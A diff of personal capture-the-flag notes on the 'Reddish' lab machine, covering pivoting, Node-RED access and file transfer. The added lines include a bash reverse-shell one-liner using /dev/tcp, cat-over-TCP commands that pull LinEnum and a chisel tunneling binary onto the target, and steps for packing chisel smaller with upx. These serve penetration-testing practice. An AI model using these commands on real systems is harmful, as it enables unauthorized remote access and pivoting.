@@ -1,6 +1,6 @@
 # Reddish
 Name: Reddish
-Date:  
+Date:  24/08/2022
 Difficulty:  Insane
 Goals:  To practice:
 - different ways pivot 
@@ -11,6 +11,8 @@ Learnt:
 1. I need to try switching more Web Requests
 2. TCP reply not listen back on shell...
 3. cat file transfer
+4. /dev/shm directory
+5. Manual(Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
 
 ## Recon
 
@@ -41,6 +43,8 @@ I would have notice the key, but not found it.. I know
 
 `ab68fb463e681b499d99226ce92e12e9`
 
+DAY 2 returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
+
 [Node-RED](https://nodered.org/about/)is a program tools visually displaying and interactable function of a program in chart
 
 
@@ -54,11 +58,15 @@ TCP reply to!
 
 ![shell](shell.png)
 
+
+`bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
+
 Even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.
+
 
 WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
 ```bash
-bash -c "cat < /dev/tcp/$IP/$PORT> /dev/shm/LinEnum.sh"
+bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
 ```
 [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM)
 
@@ -84,6 +92,25 @@ try 2!
 $3 = possibly other containers
 19:45
 https://www.youtube.com/watch?v=Yp4oxoQIBAM
+
+```bash
+cd /tmp
+git clone https://github.com/jpillora/chisel.git
+# To mimise binary size
+# -s strip binary of debug info
+# -w strip of dwarf infomation
+go build -ldflags="-s -w"
+upx brute chisel
+ncat -lvp 80 < chisel
+bash -c "cat < /dev/tcp/$IP/$Port > /tmp/chisel"
+```
+
+Ran into a lib missing error, trying this soon
+```
+go env GOOS GOARCH # current system as target
+go tool dist list
+GOOS=<os> GOARCH=<arch> go build
+```
 
 ## Exploit
 
